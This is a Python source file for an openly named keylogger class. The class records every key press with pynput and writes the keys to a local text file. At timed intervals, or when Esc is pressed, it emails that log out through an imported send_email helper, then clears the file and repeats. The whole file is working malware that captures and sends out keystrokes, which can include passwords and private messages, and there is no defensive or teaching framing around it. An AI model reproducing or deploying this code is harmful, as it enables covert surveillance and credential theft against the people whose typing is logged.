from pynput.keyboard import Key, Listener
import time

from keylogger.mail import send_email
from settings import time_iteration, number_of_iterations_end


class KeyLogger:

    def __init__(self, file_path):
        self.filename = "keys_info.txt"
        self.file_path = "\\".join([file_path, self.filename])

        self.keys = []

        self.number_of_iterations = 0
        self.currentTime = time.time()
        self.stoppingTime = time.time() + time_iteration

        self.run()

    def run(self):
        while self.number_of_iterations < number_of_iterations_end:

            with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                listener.join()

    def on_press(self, key):
        print(key)
        self.keys.append(key)
        self.currentTime = time.time()

        if len(self.keys) > 0:
            self.write_file()
            self.keys = []

    def write_file(self):
        with open(self.file_path, "a") as f:
            for key in self.keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(self, key):
        if key == Key.esc:
            self.after_stop()
            return False
        if self.currentTime > self.stoppingTime:
            self.after_stop()
            return False

    def after_stop(self):
        send_email(self.filename, self.file_path)
        
        with open(self.file_path, "w") as f:
            f.write(" ")
        self.number_of_iterations += 1

        self.currentTime = time.time()
        self.stoppingTime = time.time() + time_iteration
